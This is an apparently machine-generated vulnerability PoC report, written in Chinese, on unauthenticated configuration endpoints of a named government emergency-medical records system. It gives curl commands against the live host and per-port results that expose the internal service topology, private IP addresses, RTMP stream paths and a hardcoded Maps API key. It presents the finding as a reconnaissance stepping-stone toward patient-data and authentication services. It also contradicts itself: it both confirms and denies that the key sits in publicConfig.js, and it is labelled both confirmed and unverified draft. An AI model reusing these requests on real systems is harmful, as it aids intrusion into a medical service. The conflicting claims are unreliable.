# POC/EXP — EPCR 微服务 /config 端点无认证泄露完整内部拓扑与 Google Maps API Key

> 漏洞ID: `c8a878fa-8cc2-4b70-a617-43c9dbed6e23`  | 嚴重度: **high** | 狀態: confirmed | 目標: `https://epcr.tpf.gov.tw:4000/config, /js/publicConfig.js + 4002/4003/4005/4007 /config`

**類型**: 信息泄露 / Broken Access Control

## 描述

GET https://epcr.tpf.gov.tw:4000/config 与 4002/4003/4005/4007 /config 端点**无任何认证**返回 200 OK + JSON 含完整微服务拓扑：
- vitalSignVideoServer (4001)
- authServer (4004)
- HospitalServer (4002)
- doctorServer (4003)
- merBridge (4006)
- merServer (mer2.tpf.gov.tw:7000)
- monitorServer (4005)
- statUrl (4007)
- mciServer (4008)
- printServer (9000)

GET /js/publicConfig.js 也无需认证泄露前端配置（含 MAX_IDLE_DURATION=900000、RealTimeVideoPath、auth paths、RTMP 流地址等）。

4005 /config 还泄露内部 IP: MerSocketio=http://172.28.4.12:8080。

## 前置條件

无需前置条件 - 完全无认证

## POC / 復現步驟

```
--- retest 2026-08-31 ---
2026-08-31 15:35 CST 本机复测（未把完整 Maps key 写入战情）：

【/config 无认证 200】
- 4000 cl=1057 keys=22：vitalSignVideoServer:4001 authServer:4004 HospitalServer:4002 doctorServer:4003 merBridge:4006 merServer:mer2.tpf.gov.tw:7000 monitorServer:4005 statUrl:4007 mciServer:4008/client printServer:9000 VideoPath rtmp://mer2voip.tpf.gov.tw/rtmp/live RealTimeVideoPath mse live
- 4002 cl=375：SELF_URL/EPCRServer/authServer/vitalSignVideoServer/MerBridge/MerServer
- 4003 cl=187：EPCRServer/authServer/hospitalServer
- 4005 cl=313：MerSocketio=http://172.28.4.12:8080 且 ConnWatcher=http://172.28.4.12:8188（比原报告多一个内网口）
- 4007 cl=870：与 4000 几乎同构拓扑 + RTMP

【对比】
- 4004 /config → 401（express-jwt，mixed pattern）
- 4001 /config → 404
- 4006 /config → 403
- 4008 /config → 404
- 9000 无响应

【publicConfig.js】
- 4000 /js/publicConfig.js → 200 1087B，MAX_IDLE_DURATION=900000，含拓扑+RTMP；**无 AIza Maps key**
- 4002 200 405B；4007 200 900B；4004 200 255B（captcha/会话策略）
- 4008 /js/publicConfig.js → 401
- Google Maps API Key 在 **GET / (index.html)** 硬编码 maps.google.com/maps/api/js?key=AIza…（出现 4 次），不在 publicConfig.js

本条是侦察入口：直接指向 4001 PHI / 4008 MCI / 4004 auth，不替换那些 CRITICAL 利用单。

curl -k 'https://epcr.tpf.gov.tw:4000/config' 返回 200 OK + JSON:
{"port":"4000","hostname":"https://epcr.tpf.gov.tw","vitalSignVideoServer":"https://epcr.tpf.gov.tw:4001","authServer":"https://epcr.tpf.gov.tw:4004",...}

curl -k 'https://epcr.tpf.gov.tw:4005/config' 返回 200 OK + JSON 含 "MerSocketio":"http://172.28.4.12:8080"

curl -k 'https://epcr.tpf.gov.tw:4000/js/publicConfig.js' → 1087B JS 文件，含完整前端配置 + Google Maps API Key (硬编码)
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
